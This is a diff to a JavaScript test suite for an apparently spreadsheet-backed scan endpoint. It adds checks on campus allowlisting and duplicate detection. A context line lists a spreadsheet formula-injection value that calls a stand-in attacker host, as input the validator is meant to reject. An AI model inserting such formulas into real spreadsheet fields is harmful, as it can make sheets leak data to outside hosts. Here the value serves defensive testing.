@@ -589,6 +589,20 @@ for (const [participantId, token, uuid, validCampus, invalidCampus] of [
   assert.doesNotMatch(loggedWarnings[0], new RegExp(token));
 }
 
+for (const campus of ['Berlin', 'Heidelberg', 'Leipzig', 'Dresden', 'EBS Business School', 'Undecided']) {
+  const sheets = defaultSheets();
+  sheets.participant_url[1][0] = 'SRH University';
+  sheets.participant_url[1][1] = 'srhuni';
+  const { context, spreadsheet } = createEnvironment(sheets);
+  const request = { participantId: 'srhuni', token: VALID_TOKEN, uuid: 'A1B2C3D4', campus };
+  assert.deepEqual(postRequest(context, request), { result: 'success', duplicate: false });
+  assert.equal(spreadsheet.getSheetByName('Raw_Scans').rows[1][3], campus);
+  assert.deepEqual(postRequest(context, request), { result: 'success', duplicate: true });
+  assert.deepEqual(postRequest(context, { ...request, campus: 'Madrid' }),
+    { result: 'error', code: 'invalid_campus' });
+  assert.equal(spreadsheet.getSheetByName('Raw_Scans').getLastRow(), 2);
+}
+
 for (const [label, campus] of [
   ['a campus outside the participant allowlist', 'Barcelona'],
   ['an arbitrary formula-shaped campus value', '=IMPORTDATA("https://attacker.example")']
